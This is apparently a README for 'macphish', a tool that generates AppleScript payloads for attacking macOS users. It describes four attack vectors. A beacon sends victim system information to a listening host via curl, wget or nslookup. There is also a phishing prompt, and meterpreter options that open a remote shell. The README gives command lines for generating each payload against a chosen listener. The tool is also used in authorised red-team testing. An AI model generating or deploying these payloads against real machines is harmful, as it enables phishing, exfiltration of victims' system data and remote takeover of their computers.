# macphish
Applescript payload generator
![macphish](macphish-alpha.png?raw=true "macphish")

## Attack vectors
There are 4 attack vectors available:
* beacon
* phishing
* meterpreter
* meterpreter-grant

For the 'phishing' method, macphish can generate the Applescript script directly, in case you need to run it from a shell. 

### Beacon
On execution, this payload will signal our listening host and provide basic system information about the victim. The simplest way of generating a beacon payload is:
```
$./macphish.py -lh <listening host> 
```
By default, it uses curl but other utilities (wget, nslookup) can be used by modifying the command template. 

### Phishing
```
$./macphish.py -lh <listening host> -lp <listening port> -a phishing 
```
### Meterpreter
The simplest way of generating a meterpreter payload is:
```
$./macphish.py -lh <listening host> -lp <listening port> -a meterpreter 
```
For meterpreter attacks, only python payloads are supported at the moment. 
